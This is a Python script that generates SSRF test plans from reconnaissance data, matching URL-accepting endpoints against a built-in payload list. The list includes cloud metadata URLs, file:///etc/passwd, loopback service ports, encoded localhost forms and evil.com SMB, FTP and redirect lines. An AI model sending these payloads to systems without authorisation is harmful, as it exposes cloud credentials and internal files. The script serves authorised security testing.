#!/usr/bin/env python3
"""
SSRF Attack Template Generator
Takes recon output and generates high‑quality test cases for SSRF bugs.

Usage:
1. Prepare recon.json with assets, endpoints, and auth flows.
2. Run: python3 attack_template_ssrf.py
3. Review generated test plan in ssrf_tests.json
"""

import json
import sys
from pathlib import Path

def load_recon(path):
    """Load recon output from JSON."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"[!] Error loading recon.json: {e}")
        sys.exit(1)

def extract_ssrf_targets(recon):
    """
    Identify likely SSRF endpoints from recon output.
    Look for:
    - Endpoints that accept URLs (webhook, fetch, proxy, render)
    - Parameters like url, target, redirect, callback, return_url
    - File import/export features
    """
    targets = []
    ssrf_params = ["url", "target", "redirect", "callback", "return_url", "endpoint", "proxy", "fetch", "import", "export"]
    for asset in recon.get("assets", []):
        host = asset.get("host")
        for endpoint in asset.get("endpoints", []):
            path = endpoint.get("path", "")
            method = endpoint.get("method", "GET")
            auth_required = endpoint.get("auth_required", False)
            # Check if path or method indicates URL acceptance
            path_lower = path.lower()
            notes_lower = endpoint.get("notes", "").lower()
            if any(param in path_lower for param in ssrf_params) or any(param in notes_lower for param in ssrf_params):
                targets.append({
                    "host": host,
                    "method": method,
                    "path": path,
                    "auth_required": auth_required,
                    "notes": endpoint.get("notes", ""),
                    "likely_param": next((p for p in ssrf_params if p in path_lower), "url")
                })
            # Also check for file import/export patterns
            if any(kw in path_lower for kw in ["import", "export", "upload", "download", "render", "proxy"]):
                targets.append({
                    "host": host,
                    "method": method,
                    "path": path,
                    "auth_required": auth_required,
                    "notes": endpoint.get("notes", ""),
                    "likely_param": "url_or_file"
                })
    return targets

def generate_ssrf_payloads():
    """Generate a set of SSRF payloads for testing."""
    payloads = [
        # Internal services
        "http://127.0.0.1:80",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:9200",
        "http://localhost:80",
        # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        # GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        # Azure metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # DNS rebinding
        "http://7f000001.c0a80001.rbndr.us",
        # File schemes
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/version",
        # SMB
        "smb://evil.com/payload",
        # FTP
        "ftp://evil.com:21/payload",
        # Custom obfuscation
        "http://127%2E0%2E0%2E1:80",
        "http://0x7F000001:80",
        # Redirect chains
        "http://evil.com/redirect?url=http://127.0.0.1:80"
    ]
    return payloads

def generate_ssrf_tests(targets):
    """
    For each target, generate concrete test cases with payloads.
    """
    payloads = generate_ssrf_payloads()
    tests = []
    for t in targets:
        for payload in payloads:
            tests.append({
                "host": t["host"],
                "method": t["method"],
                "path": t["path"],
                "auth_required": t["auth_required"],
                "parameter": t["likely_param"],
                "payload": payload,
                "description": f"SSRF test with payload: {payload}",
                "what_to_watch": [
                    "Internal service response",
                    "Metadata service content",
                    "File content disclosure",
                    "Timeout differences",
                    "DNS resolution attempts"
                ]
            })
    return tests

def save_tests(tests, path):
    """Save generated tests to JSON."""
    with open(path, "w", encoding="utf-8") as f:
        json.dump(tests, f, indent=2)
    print(f"[+] Saved SSRF test plan to: {path}")

def print_summary(tests):
    """Print a quick summary of generated tests."""
    print("\n--- SSRF Test Plan Summary ---")
    print(f"Generated {len(tests)} test cases.")
    for i, t in enumerate(tests[:10], 1):
        print(f"{i:2d}. {t['method']} {t['host']}{t['path']}")
        print(f"    Parameter: {t['parameter']}")
        print(f"    Payload: {t['payload']}")
        print(f"    Auth required: {t['auth_required']}")
        print()
    if len(tests) > 10:
        print(f"... and {len(tests) - 10} more tests. See ssrf_tests.json for full list.")

def main():
    recon_file = Path("recon.json")
    tests_file = Path("ssrf_tests.json")
    if not recon_file.is_file():
        print("[!] Creating stub recon.json – please edit with real recon data.")
        stub = {
            "assets": [
                {
                    "host": "app.example.com",
                    "type": "web_app",
                    "auth_required": True,
                    "endpoints": [
                        {"method": "POST", "path": "/api/v1/fetch", "auth_required": True, "notes": "Accepts URL parameter"},
                        {"method": "GET", "path": "/api/v1/proxy", "auth_required": True, "notes": "Proxy endpoint"},
                        {"method": "POST", "path": "/api/v1/import", "auth_required": True, "notes": "File import from URL"}
                    ]
                }
            ]
        }
        with open(recon_file, "w", encoding="utf-8") as f:
            json.dump(stub, f, indent=2)
        print(f"[+] Stub created at: {recon_file}")
        print("[!] Edit recon.json with real recon data and re-run.")
        return

    recon = load_recon(recon_file)
    targets = extract_ssrf_targets(recon)
    tests = generate_ssrf_tests(targets)
    save_tests(tests, tests_file)
    print_summary(tests)

if __name__ == "__main__":
    main()
